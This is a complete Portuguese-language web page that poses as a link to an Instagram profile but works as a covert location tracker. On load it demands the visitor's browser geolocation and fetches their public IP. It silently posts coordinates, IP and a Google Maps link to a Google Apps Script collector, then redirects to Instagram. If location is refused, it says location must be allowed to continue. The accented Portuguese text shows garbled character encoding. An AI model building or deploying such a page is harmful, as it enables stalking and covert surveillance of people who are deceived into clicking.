<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Localizando...</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      text-align: center;
    }
  </style>
  <script>
    window.onload = function () {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error);
      } else {
        document.body.innerHTML = "<p>Seu navegador n√£o suporta geolocaliza√ß√£o.</p>";
      }
    };

    function success(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      fetch("https://api.ipify.org?format=json")
        .then((response) => response.json())
        .then((data) => {
          const ip = data.ip;
          const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

          fetch(
            "https://script.google.com/macros/s/AKfycbxF6dN416_NHMnlCtg9lwSmBMYyzPAsspDyZId1yekWL8rqvtrrkHCHa1SiROPMCdQCQg/exec",
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                latitude: latitude,
                longitude: longitude,
                ip: ip,
                maps: mapsLink,
              }),
            }
          )
            .then((response) => response.text())
            .then((text) => {
              console.log("Resposta do servidor:", text);
              redirecionaInstagram();
            })
            .catch((err) => {
              console.error("Erro ao enviar dados:", err);
              // Mesmo em caso de erro, redireciona para Instagram
              redirecionaInstagram();
            });
        })
        .catch((err) => {
          console.error("Erro ao obter IP:", err);
          // Se n√£o conseguir IP, redireciona mesmo assim
          redirecionaInstagram();
        });
    }

    function error(err) {
      console.warn("Geolocaliza√ß√£o n√£o permitida ou erro:", err);
      document.body.innerHTML =
        "<p>‚ö†Ô∏è √â necess√°rio permitir a localiza√ß√£o para continuar.</p>";
    }

    function redirecionaInstagram() {
      window.location.href =
        "https://www.instagram.com/_.karinaborges?igsh=ZmRubmdya2l3ZDRm";
    }
  </script>
</head>
<body>
  <p>üìç Obtendo sua localiza√ß√£o... Aguarde...</p>
</body>
</html>
